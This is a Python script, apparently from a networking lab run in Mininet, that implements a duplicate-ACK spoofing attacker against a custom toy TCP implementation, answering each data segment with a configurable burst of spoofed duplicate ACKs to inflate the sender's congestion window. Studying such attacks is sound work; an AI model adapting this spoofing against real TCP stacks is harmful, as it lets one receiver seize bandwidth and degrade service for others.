#TODO: The retransmission timer is resetting cwnd to be 1*MSS. Thus the max val
#      of sender's cwnd is capped.

from naive_tcp import *

DEFAULT_ACK_NO = 1

class DupACK_Spoofing_Attacker(TCP_Client):
    def __init__(self, num_dupacks, host):
        self.received_packets = deque()
        self.default_ack_no = DEFAULT_ACK_NO
        self.num_dupacks = num_dupacks

        if host == 'h1':
            self.src_ip = H1_ADDR
            self.dst_ip = H2_ADDR
            self.src_port = H1_PORT
            self.dst_port = H2_PORT
            
        if host == 'h2':
            self.src_ip = H2_ADDR
            self.dst_ip = H1_ADDR
            self.src_port = H2_PORT
            self.dst_port = H1_PORT

    def receive(self):
        if len(self.received_packets) == 0:
            return

        # For each data segment, we just simply reply with spoofed DupACKs
        pkt = self.received_packets.popleft()[0]
        if pkt[scp.TCP].flags == 0:
            for _ in xrange(self.num_dupacks):
                self.send_ack(self.default_ack_no)

    def start_attack(self):
        while True:
            self.receive()

    def start(self):
        listen_t = threading.Thread(target=self.listen)
        listen_t.start()
        self.start_attack()

if __name__ == "__main__":
    def check_num_dupacks(val):
        ival = int(val)
        if ival < 5:
            raise argparse.ArgumentTypeError("%s is an invalid number of DupACKs\
                    (should be at least 5)" % val)
        return ival    
    parser = argparse.ArgumentParser(description="DupACK Spoofing Attacker.")
    parser.add_argument('--num-dupacks', dest='num_dupacks',
                        required=True, type=check_num_dupacks,
                        help="Number of duplicate ACKs to send upon receiving the first\
                                data segment.")
    parser.add_argument('--host', dest='host',
                        required=True,
                        help="Mininet host (`h1` or `h2`)")

    args = parser.parse_args()
    attacker = DupACK_Spoofing_Attacker(args.num_dupacks, args.host)
    attacker.start()
